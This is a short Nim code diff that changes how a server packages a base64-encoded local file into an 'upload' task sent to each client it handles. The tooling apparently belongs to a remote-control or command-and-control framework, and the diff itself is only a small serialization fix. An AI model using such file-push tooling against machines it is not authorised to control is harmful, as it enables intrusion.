@@ -13,7 +13,7 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
   
   for client in server.cli.handlingClient:
     let fileContents = readFile(args[0])
-    let task = await client.sendClientTask("upload", %*[ encode(fileContents), args[1] ])
+    let task = await client.sendClientTask("upload", @[ encode(fileContents), args[1] ])
     
     if not task.isNil(): 
       await task.awaitResponse()
